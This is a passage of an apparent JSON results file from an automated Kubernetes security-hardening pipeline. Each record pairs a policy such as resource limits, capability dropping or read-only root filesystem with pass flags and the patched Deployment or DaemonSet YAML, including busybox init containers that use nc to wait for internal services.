    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01095",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01096",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01097",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01098",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01099",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01100",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01101",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: blossom-reposter-staging\n  name: instagram-producer\n  labels:\n    app: instagram-producer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: instagram-producer\n  template:\n    metadata:\n      labels:\n        app: instagram-producer\n    spec:\n      containers:\n      - name: instagram-producer\n        image: docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:stable\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: blossom-reposter-config\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01102",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: blossom-reposter-staging\n  name: instagram-producer\n  labels:\n    app: instagram-producer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: instagram-producer\n  template:\n    metadata:\n      labels:\n        app: instagram-producer\n    spec:\n      containers:\n      - name: instagram-producer\n        image: docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:stable\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: blossom-reposter-config\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01103",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: blossom-reposter-staging\n  name: instagram-producer\n  labels:\n    app: instagram-producer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: instagram-producer\n  template:\n    metadata:\n      labels:\n        app: instagram-producer\n    spec:\n      containers:\n      - name: instagram-producer\n        image: docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:stable\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: blossom-reposter-config\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01104",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: blossom-reposter-staging\n  name: instagram-producer\n  labels:\n    app: instagram-producer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: instagram-producer\n  template:\n    metadata:\n      labels:\n        app: instagram-producer\n    spec:\n      containers:\n      - name: instagram-producer\n        image: docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:stable\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: blossom-reposter-config\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01105",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: blossom-reposter-staging\n  name: instagram-producer\n  labels:\n    app: instagram-producer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: instagram-producer\n  template:\n    metadata:\n      labels:\n        app: instagram-producer\n    spec:\n      containers:\n      - name: instagram-producer\n        image: docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:stable\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: blossom-reposter-config\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01106",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:stable\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01107",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:stable\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01108",
    "policy_id": "drop_capabilities",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
